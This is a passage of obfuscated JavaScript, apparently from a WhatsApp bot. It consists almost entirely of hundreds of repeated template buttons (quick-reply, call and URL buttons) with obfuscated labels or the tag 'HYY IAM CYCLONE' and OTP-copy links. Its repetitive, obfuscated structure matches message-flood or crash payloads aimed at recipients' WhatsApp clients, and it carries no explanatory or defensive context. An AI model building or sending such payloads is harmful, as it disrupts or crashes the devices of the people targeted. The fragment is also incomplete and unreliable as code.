73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{